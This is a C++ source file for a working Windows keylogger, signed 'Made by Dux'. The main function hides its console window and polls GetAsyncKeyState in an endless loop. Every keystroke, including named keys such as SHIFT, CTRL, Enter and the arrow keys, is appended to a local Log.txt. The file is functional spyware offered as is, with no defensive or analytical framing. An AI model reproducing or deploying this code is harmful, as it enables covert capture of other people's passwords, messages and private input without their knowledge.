/// Made by Dux
#define IS_ACTIVED -32767
#include <bits/stdc++.h>
#include <Windows.h>

#define PATH "Log.txt"

using namespace std;

string To_String(int num)
{
    string res = "";
    while(num)
    {
        res = char(num % 10 + '0') + res;
        num /= 10;
    }
    return res;
}

void LOG(string input) {
	fstream LogFile;
	LogFile.open(PATH, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
    if(S_Key >= VK_F1 && S_Key <= VK_F24)
    {
        cout << "#F" << S_Key - VK_F1 + 1;
        string KeyName = "F" + To_String(S_Key - VK_F1 + 1);
        LOG(KeyName);
        return true;
    }
    if(S_Key >= VK_NUMPAD0 && S_Key <= VK_NUMPAD9)
    {
        cout << "#Num" << S_Key - VK_NUMPAD0;
        string KeyName = "Num" + To_String(S_Key - VK_NUMPAD0);
        LOG(KeyName);
        return true;
    }
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("Enter");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("SHIFT");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("BACKSPACE");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("R_CLICK");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("CAPS_LOCK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("CTRL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("ALT");
		return true;
    case VK_LWIN:
        cout << "#LEFT WIN";
        LOG("LEFT WIN");
        return true;
    case VK_RWIN:
        cout << "#RIGHT WIN";
        LOG("RIGHT WIN");
        return true;
    case VK_APPS:
        cout << "#APP/FN";
        LOG("APP/FN");
        return true;
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // an bang console

	fstream LogFile;
	LogFile.open(PATH, fstream::out | fstream::trunc); // xoa du lieu trong file log.txt
    if (LogFile.is_open())
    {
            LogFile.close();
    }

	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 145; KEY++)
		{
			if (GetAsyncKeyState(KEY) == IS_ACTIVED) // phim do duoc bam
            {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open(PATH, fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
				LOG("\n");
				break;
			}
        }
	}

	return 0;
}
